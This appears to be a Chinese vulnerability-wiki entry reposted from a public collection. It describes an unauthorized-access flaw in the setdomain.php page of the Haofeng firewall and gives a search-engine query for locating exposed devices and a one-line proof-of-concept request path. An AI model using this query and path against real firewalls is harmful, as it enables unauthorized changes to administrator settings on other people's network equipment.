---
title: "皓峰防火墙 setdomain.php 越权访问漏洞"
date: 2026-10-18 09:16:31
categories:
  - WebSecurity
  - CVE
  - "IoT"
  - "皓峰防火墙"
tags:
  - "皓峰防火墙"
  - "越权"
  - "漏洞复现"
---
## 漏洞描述

皓峰防火墙 setdomain.php 页面存在越权访问漏洞，攻击者通过漏洞可修改管理员等配置信息

## 漏洞影响

```
皓峰防火墙
```

## 网络测绘

```
app="皓峰防火墙系统登录"
```

## 漏洞复现

登录页面

![img](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202202110917093.png)

验证POC

```php
/setdomain.php?action=list
```

![img](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202202110916092.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/iot/%E7%9A%93%E5%B3%B0%E9%98%B2%E7%81%AB%E5%A2%99-setdomain.php-%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E.md)
